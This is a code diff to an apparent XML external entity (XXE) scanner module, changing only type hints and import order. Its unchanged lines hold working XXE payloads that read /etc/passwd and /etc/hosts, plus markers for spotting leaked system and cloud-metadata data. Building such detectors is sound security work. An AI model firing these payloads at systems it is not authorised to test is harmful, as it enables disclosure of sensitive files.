@@ -22,16 +22,15 @@ Features:
 from __future__ import annotations
 
 import asyncio
-from typing import Any, Dict, List, Optional, Tuple
+from typing import Any
 
-from titan.core.models import Finding, Severity, AttackType
+from titan.core.models import AttackType, Finding, Severity
 from titan.verify import BaselineAnalyzer
 from titan.verify.oracles import extract_error_classes, payload_encodings, score_signals
 
-
 # ── In-band payloads ──────────────────────────────────────────────────────────
 # These read files whose content should appear in the response body.
-_INBAND_PAYLOADS: Tuple[str, ...] = (
+_INBAND_PAYLOADS: tuple[str, ...] = (
     # POSIX file disclosure
     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
@@ -58,7 +57,7 @@ _SVG_PAYLOAD = (
 )
 
 # File content markers to detect (never include path components from payloads)
-_CONTENT_MARKERS: Tuple[str, ...] = (
+_CONTENT_MARKERS: tuple[str, ...] = (
     "root:x:0:0:", "daemon:x:", "bin:x:", "nobody:x:", "www-data:x:",
     "[fonts]", "[extensions]", "; for 16-bit app support",
     "ami-id", "availability-zone", "local-ipv4",
@@ -66,7 +65,7 @@ _CONTENT_MARKERS: Tuple[str, ...] = (
 )
 
 # Error strings that indicate the XML was parsed (entity resolution attempted)
-_XML_PARSE_ERROR_MARKERS: Tuple[str, ...] = (
+_XML_PARSE_ERROR_MARKERS: tuple[str, ...] = (
     "xml parsing", "xml syntax", "xmlparseerror", "parseerror",
     "entity", "dtd", "xml.etree", "lxml", "expat", "saxparseexception",
     "external entity", "systemid", "javax.xml", "org.xml.sax",
@@ -77,7 +76,7 @@ _XML_PARSE_ERROR_MARKERS: Tuple[str, ...] = (
 class XXEDetector:
     """Production-grade XXE detector with full entity injection coverage."""
 
-    def __init__(self, payload_smith, fingerprint: Dict[str, Any]):
+    def __init__(self, payload_smith, fingerprint: dict[str, Any]):
         self.payload_smith = payload_smith
         self.fingerprint = fingerprint
         self.interactsh = fingerprint.get("interactsh")
@@ -92,14 +91,14 @@ class XXEDetector:
         target: str,
         method: str,
         url: str,
-        params: Dict[str, str],
-    ) -> List[Finding]:
-        findings: List[Finding] = []
+        params: dict[str, str],
+    ) -> list[Finding]:
+        findings: list[Finding] = []
 
         # Build payload list (core + smith + OOB if available)
         all_payloads = list(_INBAND_PAYLOADS)
-        oob_payload: Optional[str] = None
-        oob_url: Optional[str] = None
+        oob_payload: str | None = None
+        oob_url: str | None = None
 
         if self.interactsh:
             try:
@@ -157,9 +156,9 @@ class XXEDetector:
         method: str,
         url: str,
         param_name: str,
-        all_params: Dict[str, str],
-        payloads: List[str],
-    ) -> Optional[Finding]:
+        all_params: dict[str, str],
+        payloads: list[str],
+    ) -> Finding | None:
         baseline_body = ""
         baseline_status = None
 
@@ -208,11 +207,11 @@ class XXEDetector:
         context,
         target: str,
         url: str,
-        params: Dict[str, str],
-        payloads: List[str],
-    ) -> List[Finding]:
+        params: dict[str, str],
+        payloads: list[str],
+    ) -> list[Finding]:
         """POST raw XML payloads with Content-Type: application/xml."""
-        findings: List[Finding] = []
+        findings: list[Finding] = []
 
         # Baseline with minimal valid XML
         baseline_xml = "<?xml version=\"1.0\"?><root/>"
@@ -257,9 +256,9 @@ class XXEDetector:
         context,
         target: str,
         url: str,
-        params: Dict[str, str],
-    ) -> List[Finding]:
-        findings: List[Finding] = []
+        params: dict[str, str],
+    ) -> list[Finding]:
+        findings: list[Finding] = []
         try:
             r0 = await context.request.post(
                 url,
@@ -300,9 +299,9 @@ class XXEDetector:
         target: str,
         method: str,
         url: str,
-        params: Dict[str, str],
+        params: dict[str, str],
         oob_url: str,
-    ) -> Optional[Finding]:
+    ) -> Finding | None:
         if not self.interactsh:
             return None
         try:
@@ -354,7 +353,7 @@ class XXEDetector:
     def _evaluate(
         self,
         baseline_body: str,
-        baseline_status: Optional[int],
+        baseline_status: int | None,
         body: str,
         resp: Any,
         target: str,
@@ -363,9 +362,9 @@ class XXEDetector:
         param_name: str,
         location: str,
         payload: str,
-    ) -> Optional[Finding]:
+    ) -> Finding | None:
         diffs = BaselineAnalyzer.diff_responses(baseline_body, body, payload)
-        signals: List[str] = []
+        signals: list[str] = []
         baseline_lower = baseline_body.lower()
 
         # Strip all encodings of payload before checking content leaks
